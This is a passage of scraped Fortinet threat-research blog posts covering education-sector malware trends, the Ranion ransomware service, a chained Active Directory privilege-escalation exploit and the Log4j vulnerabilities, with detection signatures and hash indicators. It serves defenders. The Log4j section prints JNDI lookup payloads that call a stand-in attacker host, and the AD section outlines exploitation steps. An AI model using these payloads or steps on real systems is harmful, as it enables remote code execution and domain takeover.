the Backdoor.DouplePulsar signature was triggered. The detection was most observed in Brazil, South Africa, and India, which account for 70% of the total Backdoor.DouplePulsar detections triggered. Botnet and AV Detections in the Education Sector Next, we compared Botnet activities observed in the US and worldwide to find trends. They turned out to be almost in sync. Unlike IPS triggers, which record blocked attacks, botnet detections indicate active botnet malware within a network. The Mirai IoT botnet led both regions, followed by Gh0st Rat and Zeroaccess. Together, they account for more than 50% of the botnet activities in the US and global education sectors. As the malware source codes of those three botnets are readily available, the education sector is a potential target of both serious and novice botnet attackers. The following graphs show the top five AV detection observed in the education sector in the US and worldwide, from August 11 th to September 10 th , 2021. This data indicates which malware was blocked during that period. Cryxos was to most common malware triggered in the US as well as worldwide. This malicious JavaScript variant is typically associated with fake call support scams. It shows a fake pop-up warning that the victim’s machine has serious issues. The victim is further instructed to call support for a bogus fix as they risk losing sensitive data. The scammers then ask for a payment, either through a credit card or via gift cards. Other common attacks included: W32/Swizzor!B.tr is an old Windows malware that has been around for years. The malware is designed to show unwanted ads on a targeted machine or download and execute remote files. As a result, a device infected with Swizzor may show other behaviors (i.e., data exfiltration) that are known to be associated with the malware. JS/Miner.BP!tr is a malicious javascript that mines for cryptocurrency without the user’s knowledge. A victim’s machine may experience slower performance and higher electricity usage. W32/Agent.DRI!tr.dldr is a type of trojan malware designed to download and execute remote files. Just like Switzzor, a machine infected with this malware may exhibit malicious behaviors. W32/RanumBot.X!tr is a type of Trojan that opens a backdoor and awaits commands from its Command & Control server. Its behavior is dependent on the remote commands it receives. Conclusion - Education Sectors As with any other industry sector, educational institutions are not exempt from cyberattacks. Backdoor infections lead to information leaks that may be vital to an institution's research effort or steal PII of students, parents, and faculty. A publicized attack can lead to financial loss, brand damage, and loss of faith and reputation by its affiliates and partners. Even worse, not only can ransomware be deployed against a vulnerable network, but access to a compromised network can also be sold on the black market to other ransomware gangs. One of the most critical takeaways from nearly every research of this kind is that criminals overwhelmingly target known vulnerabilities with available patches. This makes cyber hygiene a top priority. Similarly, it reemphasizes the need to backup critical data. If regular backups are not implemented or are not properly managed, it could cost the institutions hundreds of thousands of dollars to replace affected devices. However, even when a victim has secured backups and an excellent recovery plan in place, attackers will still threaten to leak stolen data. If the ransom is not paid, they release everything on the dark web. Therefore, it is imperative to have a solid prevention and recovery plan against ransomware in place, including the encryption of all data at rest. Similarly, botnets are an indirect threat to those organizations that become a part of the attacker’s infrastructure. The attacker can exploit their bandwidth to launch DDoS attacks against other parties, move laterally to other institutions, or leverage the compute power for crypto mining or other illicit purposes. This will eventually result in a loss of productivity and revenue for those victims. We cannot emphasize more emphatically the following statement from a blog posted by Fortinet earlier this year, entitled, “ Threats Impacting Education Cybersecurity ”: “It’s common knowledge that the cost and effort associated with attack prevention tend to be significantly less than the cost associated with the fallout of a successful attack. Therefore, in education cybersecurity and beyond, investing in comprehensive cybersecurity strategies not only protects sensitive data and infrastructure but can also help reduce costs down the line.” Fortinet Protections and Recommendations FortiGuard Labs has the following AV coverage in place for the malware associated with this blog: FortiGuard Labs has the following AV coverage in place for malware associated with this blog: W32/Ransom.REVIL!tr W32/Ransom_Revil.R03BC0DHU20 W32/DarkSide.B!tr.ransom W32/Darkside.AO!tr.ransom ELF/Darkside.A9B5!tr.ransom W32/Darkside.50B7!tr.ransom W32/Darkside.B7D5!tr.ransom W32/Filecoder.NYO!tr.ransom W32/Zudochka.DLR!tr.ransom W32/DoppelPaymer.BM!tr PossibleThreat.PALLASNET.H W32/PossibleThreat W32/RanumBox.X!tr W32/Agent.BMGF!tr.dldr JS/Miner.BP!tr W32/Swizzor.B!tr JS/Cryxos.DEB1!tr FortiGuard Labs has the following IPS coverage in place for the malware associated with this blog: Telerik.Web.UI.RadAsyncUpload.Handling.Arbitrary.File.Upload PHPUnit.Eval-stdin.PHP.Remote.Code.Execution Apache.Struts.2.Jakarta.Multipart.Parser.Code.Execution ThinkPHP.Controller.Parameter.Remote.Code.Execution Dasan.GPON.Remote.Code.Execution NTP.Monlist.Command.DoS Nmap.Script.Scanner SolarWinds.SUNBURST.Backdoor Port.Scanning Backdoor.DoublePulsar Qualys.Vulnerability.Scanner Mirai.Botnet XcodeGhost Andromeda.Botnet Torpig.Mebroot.Botnet Zeroaccess.Botnet Backdoor.Cobalt.Strike.Beacon Kaseya.VSA.Remote.Code.Execution Darkside.Botnet The Fortinet fabric can offer end to end protection to educational institutions using the following technologies - FortiMail (blocking phishing attacks and malicious attachments), Web Filtering (blocking malicious URLs), FortiEDR (real-time and cloud-based protection), FortiSandbox (identifying and preventing unknown attacks), FortiToken (multi-factor authentication), and intent-based segmentation (preventing lateral movement). Organizations are also strongly encouraged to conduct ongoing end-user training designed to educate and inform personnel about the latest phishing/spearphishing techniques and how to spot and respond to them. This should include encouraging employees to never open attachments from someone they don't know and always treat emails from unrecognized/untrusted senders with caution. Since it has been reported that many phishing and spearphishing attacks are being delivered as part of social engineering distribution mechanisms, end-users must also be made aware of the various types of attacks currently in use. The FortiPhish cloud-based phishing simulation service uses real-world simulated phishing attacks and analysis to test user awareness and vigilance and help hone training efforts. Regular training sessions on how to spot emails with malicious attachments or links combined with impromptu tests increase user awareness and helps prevent initial access into the network. Zero Trust Network Access (ZTNA) addresses all types of attacks/threats: Reduces Attack Surface—ZTNA only allows access to specifically requested applications rather than the network-level access provided by traditional VPN. Ensures Endpoint Security Compliance—Checks to ensure the endpoint is compliant with your security policies (no critical vulnerabilities, has adequate security enabled, etc.) and only grants access to compliant endpoints. Verifies that users and devices accessing resources are “authorized.”  Identifies devices and users on a per-session basis and uses that information to make smarter decisions for application access (Should that device be allowed to access this application?  How about if the connection is from xyz geolocation? What about after-hours?). Not all endpoints should have access to all resources because they are connected to the local network or are part of the domain. Segmentation – reduces exposure in the event of compromise by preventing the lateral movement of malware. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/ranion-ransomware-quiet-and-persistent-raas": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-09-30",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Many thanks to Val Saengphaibul who contributed to this blog. Affected platforms: Microsoft Windows Impacted parties: Windows Users Impact: Encrypts files on the compromised machines and demands ransom from the victim to recover the encrypted files. Severity level: High Ranion is a Ransom-as-a-Service (RaaS) that has enjoyed unusual longevity as it has been active since at least February 2017. While its activities and purpose—encrypting files on compromised machines and receiving ransom payment from the user to recover their files—may seem the same as other ransomware in the public’s eyes, the truth is that the inner workings of Ranion RaaS are unlike other ransomware. In this blog, FortiGuard Labs will explain how Ranion RaaS works. The opening lines of The Tale of Heike, a martial epic about the civil war between the Taira and Minamoto clans in 12 th -century Japan, help describe the rise and fall of various ransomware groups in 2021. “The Jetavana Temple bells ring the passing of all things. Twinned sala trees, white in full flower, declare the great man's certain fall. The arrogant do not long endure: They are like a dream one night in spring. The bold and brave perish in the end: They are as dust before the wind.” ― Royall Tyler, The Tale of the Heike Ransomware Operations are Short-Lived For those of us monitoring cybercriminal organizations and malware , ransomware often has a very short shelf life. Some of the most notable ransomware movements in 2021 include: Disappearance: The REvil (aka Sodinokibi) gang that had been active since 2019 went dark in June. The Avaddon ransomware group halted its operations in June. It had begun its operations in 2019. The Ragnarok ransomware gang, in operation since 2019, shut itself down in August and released its decryption key. Darkside first appeared in 2020 and closed in May after compromising a major US pipeline company. FonixCrypter ransomware gave up its criminal life in January and released a decryption tool and its master decryption key. The master decryption key can decrypt all files, regardless of the victim, that had previously been encrypted by FonixCrypter. Debut and Rebranding: Ads for Blackmatter ransomware went up on cyber underground forums in July. While Blackmatter is not a rebrand of another ransomware, affiliation with the Darkside gang is rumored. Haron ransomware debuted in July and is based on Thanos and Abaddon ransomware. Doppelpaymar ransomware was rebranded as Grief (PayOrGrief). SynAck ransomware was rebranded as El_Cometa in August. The average life span of the ransomware listed above, that either disappeared or rebranded itself in 2021, is a bit less than two years. Reasons for halting operations vary from one ransomware group to another, but they usually do so to escape the unwanted attentions of law enforcement and security researchers. Ranion Still Going Four Years Later The Ranion ransomware variant that FortiGuard Labs recently came across bucks that trend. The Ranison ransomware family appears to have been around since at least early 2017, giving it more than four years of longevity. In February of that year, Daniel Smith at Radware Security shed the first light on the Ranion ransomware, describing it as Ransomware-as-a-service. Surprisingly, its website on the Dark Web has remained relatively unchanged: the Ranion developer still maintains its claim that Ranion was created for educational purposes and asks users not to use the ransomware for illegal activities. The latest version of Ranion, version 1.21, was released in July 2021. Amazingly, the Ranion developer has updated the ransomware every month in 2021 (except for May), including updates for detection evasion, which casts doubt on the claim that the ransomware is for educational purposes. Another interesting data point is that version 1.08 was released in at least January 2018 and was only updated seven times over a 35-month period (January 2018 – December 2020). However, it has seen rapid acceleration in its development in 2021, with six updates over a seven-month period for unknown reasons. Each update made in 2021 contains additional code using an open-source program named ConfuserEx to evade detection and protect the security vendors’ identities. We will touch on this part later. Ranion RaaS Explained The latest version of Ranion ransomware is designed to encrypt files on a compromised machine using the following 44 file extensions, an increase of five new file types over previous analyses (newly added extensions are highlighted in orange): Although the ransomware is not designed to encrypt executable files, the Ranion developers state that users “can request other additional file types/extensions to encrypt for free as any files can be a target of Ranion ransomware.” How Ranion Makes Money Originally, back in 2017, Ranion offered users two support packages (a 1-year and a 6-months service). Today, the Ranion team offers four support packages: Elite, Premium, Standard, and Test. Figure 3: Ranion ransomware packages and prices Previously, the most expensive package was offered for 0.95 bitcoin and the cheapest for 0.60 bitcoin. In February 2017, one bitcoin was worth about 1,200 US dollars, which means these packages sold for around 1,140 USD and 720 USD, respectively. As of September 2021, one bitcoin exchanged for around 50,000 USD so Ranion developers have adjusted their prices, and they also now offer discounts for easy-to-buy add-on options. Ranion’s business model is quite different from other RaaS vendors. Typically, Ransomware-as-a-Service vendors pay out 60%-80% of any ransoms collected to their “affiliates” that have successfully installed their ransomware onto a victim’s machine. The Ranion developers do not take a middleman’s cut. Instead, their affiliates pay for the RaaS service upfront, and they then receive 100% of any ransoms collected. And while some RaaS vendors try to recruit experienced affiliates, and often screen potential affiliates before allowing them to sign up for the service, Ranion developers do not. This is one of the reasons why many inexperienced affiliates start with Ranion. It allows then to get used to the ransom operation. It is also a choice for affiliates who were unable to pass the screening process imposed by other ransomware gangs, thereby lowering the bar for entry. To see how well this model works, we tracked some Bitcoin wallets used by one of the older Ranion samples for ransom payment. Two moderate payments, totaling about USD $153 and $460 worth of Bitcoin, were made to the wallet within a week of the Ranion sample being made available. But a Bitcoin wallet used by Ranion has recorded transactions from two other Bitcoin wallets. About $4.7 million USD worth of Bitcoin was transferred to one of those wallets from over 300 different Bitcoin wallets. Dropper Add-On Another notable characteristic of Ranion is that it provides an opportunity for buyers to purchase a dropper add-on. At first glance, a “dropper” may sound like a malware add-on that Ranion affiliates can use to deliver ransomware, but it’s not. According to an FAQ posted on the purchase site, the add-on dropper has the following description: “ RANION can download a program of yours (exe file) and execute it after encryption process ended. ” For example, an attacker might use this add-on to silently download and install a remote access tool “RAT” on a victim’s machine infected with Ranion. Even if the victim opts to pay ransom, the Ranion decrypter only decrypts the encrypted files but does not remove the RAT. The Ranion affiliate can then turn to other RaaS services that are willing to purchase existing corporate access (recent Lockbit 2.0 and Blackmatter RaaS quickly come to mind) and sell that compromised victim for additional profit. This scheme can surely be “educational,” but it’s only good for ransomware affiliates. 1 AUP is available for purchase The Ranion Ransomware Delivery Method The Ranion ransomware’s delivery method recently observed by FortiGuard Labs is very straightforward. It was done through a spearphishing email with a zip file attachment that included the Ranion ransomware executable. As Ranion is more suited for beginner threat actors, the lack of sophistication in their ransomware delivery might be a reason why Ranion has not gained household status in the ransomware realm. This may also be why they have managed to stay under the radar for more than four years. Ranion’s ransom message supports eight languages by default (English, Russian, German, French, Spanish, Italian, Dutch, and Persian). Any regions in which those languages are primarily used can be a target of Ranion. Ranion Ransomware Origin: HiddenTear Copycat? Ranion bases its code on the open-source proof-of-concept ransomware known as HiddenTear. There are some code similarities between the two projects. The above screenshot is from HiddenTear’s implantation of an encryption function. It can be found at https://github.com/goliate/hidden-tear/blob/master/hidden-tear/hidden-tear/Form1.cs . For comparison, Ranion’s implementation is below: To encrypt files, HiddenTear uses this function. Ranion implements its encryption in a similar fashion. These are just two examples. Overall programming resemblance can be seen in a variety places. In addition, Ranion kept their resource section similar to HiddenTear’s as well. NOTE: This Ranion variant is from 2017 and has a SHA256 hash value of eed03a9564aee24a68b2cade89d7fbe9929e95751a9fde4539c7896fda6bdcb5 To Be FFFFUUUUDDDD To be fully undetectable, the Ranion team has consistently relied on the ConfuserEx project, which is the successor of the now defunct Confuser project. It is a free and open-source obfuscator that makes malware harder to analyze by “protecting” .NET applications through symbol renaming, anti-debugging, encryption, compression, and other functions. (For more info, please see the github project page here .) The 2017 Ranion variant analyzed below was “protected” by the Confuser project. The following 2021 variant of Ranion was “protected” using the ConfuserEx project. While ConfuserEx is able to do what it says, which is “protect” .NET applications, in this case it is protecting malware from being detected by the AV industry via evasion techniques. Conclusion - Ranion Ransomware HiddenTear-based Ranion is a low-profile, low-cost RaaS that has not achieved the same success of other, more notorious ransomware gangs. However, this ransom service provides enough basic features for new threat actors to use it as a steppingstone for working with more sophisticated malicious services. Ranion is only “educational” in that it helps train wannabe cyber criminals inflict the same damage as other ransomware variants that have simply adopted more polished and sophisticated delivery and propagation mechanisms. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s AntiVirus and FortiEDR services, as follows: MSIL/Kryptik.LMX!tr MSIL/Agent.AZG!tr MSIL/Agent.BJU!tr MSIL/Bladabindi.FM!tr MSIL/Filecoder.FU!tr MSIL/GenKryptik.BLYY!tr MSIL/GenKryptik.FEWS!tr W32/Crypmodadv.A!tr W32/DOTHETUK.FU!tr.ransom W32/Hesv.BXFI!tr Indicators of Compromise (IOCs): SHA2: 52f6e8c0c28f802d8dfd9138bcc971d449d0526469a36541359b6fc31d44d7dc d63f032180d6cbc3165f79dac13f81e69f3176b06f0ff4b162b167e4f45f5e93 f687c51ee4889c6a35536d06c87b0123d17a483f7e2f5efcfb423fba94e186be f18044a85ceb3c472ae57e3473e2f14f945f22a9df634caa242b11e5f81c561b e4c42969a0327ce133b8b6dd52b0f2e926fbc43a48cf2abbd78d521e310b00e4 41ad23008aea13bccf60249c24ee290e9867223d783bc9ddc4234b8e1d21008d d894cfa1f2e55ea8fb61598d1312d92c6c1667f97ec683dfa5b5350b32402099 2a8f7abaa6b896bdcc8f73a78af89274df5ee5f586edb88a0b4fd0b06cbaf6bd 19b2da9261d163d3a8e25916b0c960bae36d4334172faa2eb7f720c7483f0fb1 434bbb0e4f289944e6c1fafc11e7f3353056857fb90abafd17e2c6ec697d94b3 bbe77c293bf11c5e8d26ff1583cf546a346de5d666e5558b17f056f1117ddaf8 7afbb979ac6485cbe4d21955dd0f4444d67d2b99aa3d420c09bcc7d54949ed7c ac5e6f8e646311bf3645ccdccf7119712ada6811d973444d3a763d17083ef028 2ab7ba4aa579ffda113b3f1a693cb2f6b45c5adb833301762d623089f5e37694 4ad4aabd3ec941e6eb442aadae23e01539f63c093582ebf9239681fe399c7571 e28afea1a286b27c9f4578cb27729e180dd20f406282e489328e11722b37af73 8a4298a5c2101baf0315a2c5ed297a6b9912c673a200a7082fb96fcaa21a7316 798a618bf3b817751de722bc84475d5dca798fb48e844804d530e34e920fad09 bd82bb30089383547fcc1ab8181c957f770a99c1499db211fa3245135fcce2be eba37b0cef846c16bca30804557d7dae57b16cda506a111e2e4c6f7ef54cab70 507cc65037febbad93cd5a4c10d1e870f4f73069484bd7913349deb139c18ea2 b93a45691e955d4600dde6219125f0a38b0544ad48872bc4ebda5436cf2c0bc0 abf13688180d505d07b04a6643941a571de1efd97b46631abfafd555863ec33e 0f2bbf749501297928efbd4a12d8a1858c7944516e8b15817988a429eae4e632 a9671f6455895b1e0875eec277015672ea816dc5299cfd519db2dc4bc38ce693 0a59c6b2ec5dbaa7e36b52dc494d1e58e918f32695cfb28104a5c82b09a9554f ca7aaa3de1948dc882d55d40a0269a145e34f1e07b2b1e932040863e6d1dedb8 27cb1df4a3092c42ddfd93db50cc78813a823a881e6d131410915d0ded6515c4 46b9c46520f00b25924cc0a137393f67a0f4395da8cdc37b32985b90d7285252 46462ba2ac8018901239800f1c4562a31618b1565fe559ab826feef303adab8d df7c5267c9e61d7b23a3a771623c6b274fb601023725a8af1b8bc25ae8bcbdb6 0085d31140895d16a2f92a77b62fb50db0d05fa47b447e21bca062532b5bf0d2 780a576b7ea69b46eb8a698aac0c6ee6e2e426fddcd7a99b749f5aa083e8f72b 94968c73dacfd68500ca59905e410ca4ccafe92cd8e223ed47ad916ee82a6dfb c18c9cf30056d9ebfda69bb9869a38b5ab2d2e3d388a747d7ec8516e022aa7e9 19d9ec2713d913d5325a72ce646351a2384d86efd5dcecebb354ef2bc9e801a2 c38e068677903ccd9b117bacaa3b201616668e449856f8d14894f9acf3f6e9cc 378b34a3e1f760dc7d6c5ff742c543a0184a255c7c3422e348eab05dca1377f9 e9352eb25a1ef3fc8d88fd62a4253d4b8db3931366f012e9ee7916818f74ad55 f7b6ac95cbf4f4122c67e3f841de1152cb032e36d768cd71618cbaf95f131727 df16d6b57a0290b8d7276285020cf6cf5e7c4a561516500fd44e862ea32c1073 dbd00dffb77998d4b0c9946e727279831f19e5d58059b0de353cb191f6c3ca00 1bbc33db0c52d5c3f2798f726bb476cf20d00eeae971e98926bbfbf194e7e03c 98f16b75d1c9e3c8914b10de4b6286397285d226785b42766847b35558ee0dc7 86c6a8c1cd461dafdc30ce37eca355f096ff35ccd48b4de3f2f3bd56d0cef543 c5234f098cf2319c813e8025e0ea04b4f45de4ad195b64ba80fe9a098de54431 0361585476c9e04cbe9efac74fe76e32d84e2e682ac4a8e5f67860a719e7b6d0 1fdaae6a5b1d69d795a07b5518568964dc53e181b22ad2427e7f10c60d61241b 4824c68f18089c44af8426b9a2d7960f5caa572777a46b3a172093b321acbf1d eed03a9564aee24a68b2cade89d7fbe9929e95751a9fde4539c7896fda6bdcb5 023b12665ff5c46331ece74d220c52a28439ada61210183bbd921e1ef833645c aa9bbffae11e2a2af53acbb56129d99cb93c78c98202f5c19b095f9ed296a2ce ea00fffa874669e743d125fcdb55ba591a54d469c621eada61f304495269a35c f389a83b1309ff17c9c0faf1d9e079ceae3b4111c6813ad50bd451a9a19b291b 33d24a576f00847d44315c1d6d588a3aa45031dec2b1590bc67bc6800e455cf6 MITRE ATT&CK information Execution - T1204.002: Malicious File Persistence - T1547.001: Registry Run Keys/Startup Folder Privilege Escalation - T1548.002: Bypass User Account Control Defense Evasion - T1027.002: Software Packing - T1548.002: Bypass User Account Control - T1562.001: Disable or Modify Tools Discovery - T1083: File and Directory Discovery Impact - T1486: Data Encrypted for Impact - T1491.001: Internal Defacement Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds": {
                "metadata": {
                    "dateAccessed": "2022-01-06",
                    "dateCreated": "2022-01-05",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Windows Impacted Users: Any organization with an Active Directory environment Impact: Unprivileged user can escalate privileges to domain administrator Severity Level: Critical On Patch Tuesday of last November, Microsoft released advisories to address several vulnerabilities in Active-Directory. Analysis of these vulnerabilities showed that by combining CVE-2021-42278 and CVE-2021-42287 it is possible, under default conditions, for a regular user to easily impersonate a domain admin. This means that any domain user can effectively become a domain administrator, which makes these vulnerabilities extremely severe. Moreover, there are already several Github repositories with free-to-use PoC code that facilitates the exploitation of these vulnerabilities. In this post, we will describe how the exploitation of these vulnerabilities works and show how the attack is mitigated by FortiEDR. CVE-2021-42278 - Invalid Computer Account Name Computer account names in Active Directory environments should always end with “$”, however, this is not enforced correctly. The computer account name attribute is “sAMAccountName”. It is possible to see and edit the this attribute manually using the ADSIEdit Tool, as can be seen in Figure 1. On vulnerable machines it is possible to rename it to a domain controller account name, which is a key step in the exploitation chain. Security Principal Name A security principal name (SPN) is the name that identifies an authenticated entity—for example, machinename$@domainname. SPN s are used by Kerberos as part of the authentication procedures of various entities. It is basically a unique identifier of a service instance and used by Kerberos authentication to associate a service instance with a service logon account. This may pose a problem when trying to rename a computer account to a domain controller account because changing the samAccountName attribute will trigger a respective change to the SPN of the account. The attempt to change it will fail because an SPN with this name already exists. To overcome this, it is possible to clear the machine “servicePrincipalName” attribute. As a result, privilege to edit the “servicePrincipalName” attribute is also required to exploit this vulnerability. CVE-2021-42287 - Kerberos Key Distribution Center Confusion The Kerberos Key Distribution Center (KDC) is a service of Active Directory that handles Kerberos ticket requests. A Ticket-Granting Ticket, or TGT, is a special type of ticket that can be used to obtain other tickets. TGT is used to request access tokens from the Ticket Granting Service (TGS) for specific resources/systems in the domain. When a request for a service ticket is sent and it is not found, the KDC will automatically lookup the requested ticket appended with “$”. S4U2self, or Service for User to Self, is an extension that allows a service to obtain a Kerberos service ticket for itself. The service ticket contains the user's groups and can therefore be used in authorization decisions. All Active Directory terms and full explanations can be found here . The vulnerability can be triggered in a scenario where a user obtains a TGT, the user gets removed, and the previously obtained TGT is used to request a service ticket for another user for themselves—basically, S4U2self. In this case, the user will not be found and a lookup for the user with appended “$” will be executed. And if a domain controller account with the name exists, a service ticket will be granted to the requesting user, making the requesting user a domain administrator. Combining the Vulnerabilities To exploit this issue, an attacker needs the ability to control a computer account. As mentioned, the attacker needs to be able to modify both the “servicePrincipalName” attribute and “sAMAccountName” attribute. The simplest way to achieve this is to create one. The default configuration in a domain allows an unprivileged user to create up to 10 computer accounts. This is controlled by the MachineAccountQuota attribute. In summary, the steps to exploit these vulnerabilities to gain domain-administrator privileges are as follows: 1. Enumerate the Active-Directory to find a domain administrator account. 2. Create a new computer account with cleared “servicePrincipalName”. 3. Leverage CVE-2021-42278 to modify the “sAMAccountName” to the domain administrator account name. 4. Get a TGT of the computer account. 5. Restore the computer account name so it will not be found when the KDC looks for it. 6. Leverage CVE-2021-42287 using the obtained TGT to request a service ticket with S4U2Self. Implementation of the exploit can be found here . Figure 2, below, shows the execution of the exploit code against a vulnerable server: Protecting Against Exploitation The combination of CVE-2021-42278 and CVE-2021-42287 vulnerabilities enables unprivileged users to easily become domain administrators. As a result, we urge organizations to apply Microsoft patches KB5008380 and KB5008602 as soon as possible to mitigate the issue. FortiEDR is able to detect and block exploitation attempts of CVE-2021-42278 and CVE-2021-42287 vulnerabilities. Moreover, it is also capable of tracing the source of the attack: FortiGuard IPS protects against these exploits with the following signature: MS.Active.Directory.SAM.Privilege.Escalation These exploits are detected and prevented in FortiGuard IPS DB 19.228 (FortiGate, FortiADC, FortiProxy) and FortiEDR 5.0.  Please ensure your devices have downloaded the latest protections. For more detail and information on threat hunting across the Fortinet Security Fabric, please see the FortiGuard Outbreak Alert . Appendix https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#solving-a-sensitive-problem https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8a d1-e9ab71e0bc47#gt_2214804a-4a44-46f4-b6d2-a78f4ff39a39 https://github.com/WazeHell/sam-the-admin Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/critical-apache-log4j-log4shell-vulnerability-what-you-need-to-know": {
                "metadata": {
                    "dateAccessed": "2022-01-06",
                    "dateCreated": "2021-12-21",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Any application and service that uses vulnerable version of Log4j2 Impacted Users: Any organization that uses vulnerable version of Log4j Impact: Remote attackers gain control of the vulnerable systems Severity Level: Critical Thanks to Paolo Di Prodi and Arturo Erick Torres Cavazos, who helped contribute to this blog. Log4j Vulnerabilities Beginning December 9 th , most of the internet-connected world was forced to reckon with a critical new vulnerability discovered in the Apache Log4j framework deployed in countless servers. Officially labeled CVE-2021-44228 , but colloquially known as “Log4Shell”, this vulnerability is both trivial to exploit and allows for full remote code execution on a target system. This has earned the vulnerability a CVSS score of 10 – the maximum. On December 14 th , the Apache Software Foundation revealed a second Log4j vulnerability ( CVE-2021-45046 ). It was initially identified as a Denial-of-Service (DoS) vulnerability with a CVSS score of 3.7 and moderate severity. Things went from bad to worse on December 16 th due to the discovery of information leaks and the remote code execution nature of the vulnerability. This promoted Apache to update the advisory and upgrade the CVSS score for this vulnerability to 9.0. On December 18 th , a third Log4J vulnerability was discovered ( CVE-2021-45105 - Apache Log4j2 does not always protect against infinite recursion in lookup evaluation). This fix was released in response to a newly discovered vulnerability that makes Log4j susceptible to a Denial-of-Service attack (DoS). On December 19 th , a \"wormable\" variant of the Mirai IoT malware incorporating exploit code for CVE-2021-44228 was discovered. Various chatter on OSINT channels has discussed whether this is a \"worm.\" This blog describes what you need to know about the Apache Log4j vulnerabilities , including details, campaigns associated with Log4j, and an alleged “wormable” Mirai malware variant. What is Log4j? Significance of Log4j Vulnerabilities Log4j is an extensible, Java-based logging framework widely used by applications and services around the globe (CISA list of related software). Often, a dependency on Log4j will be two to three layers deep (a dependency of a dependency). The ubiquitous nature of Log4j is part of what makes CVE-2021-44228 so dangerous. Millions of applications, such as iCloud, Steam, and Minecraft, use Log4j for logging. An attacker simply needs to get the app to log a special string to successfully exploit this vulnerability. The Log4j framework provides an interface with the JNDI (Java Naming and Directory Interface), which allows a connection to an external directory service such as LDAP (Lightweight Directory Access Protocol). This forms the basis of several exploitation attempts currently seen in the wild, whereby insecure JNDI lookups potentially allow an unauthenticated, remote attacker to execute arbitrary code. Interestingly, the initial exploit leveraging CVE-2021-44228 appears to have been created before the patch was released. According to Cloudflare , the exploit was found as early as December 1 st , nine days before the patch release. It is also worthy of a mention that Minecraft was the canary in the coalmine highlighting the problem, as it was one of the first servers to be attacked. What Happ ened? On November 24 th , Alibaba’s Cloud Security Team reported a critical vulnerability in Log4j to The Apache Software Foundation. In response, Apache published a release candidate on December 6th to address this vulnerability, which Alibaba’s Cloud Security team found insufficient. Before Apache made the necessary update, a tweet was posted on December 9 th, insinuating that abusing JNDI Lookup in Log4j can lead to remote code execution. This post appears to have triggered a maelstrom in both security and hacker communities. The following day, Apache released Log4j 2.15.0 as an official fix. Around this time, attackers started to sniff for potential victims by scanning for vulnerable machines. On the same day, CISA released an advisory urging users and admins to upgrade Log4j to 2.15.0 as soon as possible. The advisory was followed by an Apache Log4j Vulnerability Guidance page detailing the issue. SANS then moved their Infocon alert to yellow for the first time since the infamous WannaCry outbreak in 2017. Infocon alerts intend to reflect changes in malicious traffic and the possibility of disrupted connectivity and apply to the condition of the Internet infrastructure. Infocon has only previously been elevated to yellow status for severe incidents, such as Heartbleed and Shellshock (both in 2014), which signifies the severity of Log4Shell. The situation worsened on December 14 th , when Apache released Log4j 2.16.0 due to an insufficient fix in the previous release. This second vulnerability, labeled CVE-2021-45046 (with a CVSS score of 3.7), causes a Denial of Service (DoS) condition when successfully exploited. Threat actors wasted no time leveraging Lo4Shell by deploying new malware and potentially unwanted programs (PUAs) to compromise vulnerable machines. On December 16 th , Apache upgraded the CVSS score for CVE-2021-45046 from 3.7 to 9.0. Further investigation revealed that an information leak and remote code execution in some environments and local code execution in all environments could be achieved due to successful exploitation. The Severity was also changed from moderate to critical. Log4j version 2.17.0 was released on December 18 th in response to another Log4j vulnerability. Labeled CVE-2021-45105, the newest security hole is a Denial-of-Service vulnerability with a CVSS score of 7.5 and is rated as High by Apache. How does the exploit work - CVE-2021-44228? Once a target has been selected, an attacker adds a JNDI query to a connection request to that target in a field that is likely to get logged via Log4j. For example:  “$ {jndi:ldap://malicious-server.host/aaa} ” A vulnerable version of Log4j then takes that request and attempts to contact “malicious-server.host” with an LDAP query. Should the connection be successful, the “malicious-server.host” under the attacker's control replies to the query by inserting a malicious Java class file location into the directory data. The Java implementation on the target then downloads the malicious Java class file and executes it. How does the remote code execution exploit work - CVE-2021-45046? Once a target has been selected, an attacker adds a JNDI query to a connection request to that target in a field that is likely to get logged via Log4j. Due to the fix for CVE-2021-44228 in Log3j 2.15.0, remote JNDI queries are no longer permitted by default.  Therefore, this can be worked around using the following as an example:  “${jndi:ldap://127.0.0.1#malicious-server.host/aaa}” Version 2.15.0 of Log4j will view the request as valid due to localhost being present before the “#”; however, the framework will still resolve the entire string and attempt to contact “malicious-server.host” with an LDAP query. Should the connection be successful, the “malicious-server.host” under the attacker's control replies to the query by inserting a malicious Java class file location into the directory data. The Java implementation on the target will then download the malicious Java class file and execute it. How does the Denial of Service (DoS) exploit work - CVE-2021-45105? This vulnerability is not considered part of Log4Shell. This will be more complex to execute because an attacker would need to have knowledge and control over lookup commands (e.g., via the Thread Context Map).  The vulnerability is an infinite recursion so a successful exploit would result in a Denial-of-Service (DoS) attack. To take advantage of this, the vulnerable (or malicious) application will need to use a Context Map Lookup with a custom pattern layout. A log line can be crafted in such a way that when it is triggered, an infinite loop condition is triggered thereby creating a denial of service through the exhaustion of resources. e.g. logger.info(\"Example log line {}\", 